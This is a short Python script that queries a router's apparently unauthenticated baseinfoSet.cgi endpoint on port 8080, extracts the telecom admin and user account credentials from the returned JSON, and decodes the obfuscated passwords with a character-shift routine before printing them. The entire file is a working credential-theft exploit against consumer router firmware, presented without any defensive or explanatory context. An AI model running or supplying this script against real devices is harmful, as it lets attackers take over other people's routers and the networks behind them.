from urllib.request import urlopen
import json

def passwd_decode(code) -> str:
    passwd_list = map(int, code.split('&'))
    result=[]
    for i in passwd_list:
        if 97 <= i <= 100 or 65 <= i <= 68:
            i += 22
        elif i > 57:
            i -= 4

        result.append(chr(i))
        #print(i, chr(i))
    return (''.join(result))

IP = input("Please input IP address of the router: ")
URL = f"http://{IP}:8080/cgi-bin/baseinfoSet.cgi"

_ = urlopen(URL)
data = json.loads(_.read())
baseinfoSet = data["BASEINFOSET"]

admin = [baseinfoSet["baseinfoSet_TELECOMACCOUNT"],
         baseinfoSet["baseinfoSet_TELECOMPASSWORD"][:-1]]
user  = [baseinfoSet["baseinfoSet_USERACCOUNT"],
         baseinfoSet["baseinfoSet_USERPASSWORD"][:-1]]

print ("\n")
print (f"Admin:\n{admin[0]}\n{passwd_decode(admin[1])}\n\nUser:\n{user[0]}\n{passwd_decode(user[1])}")
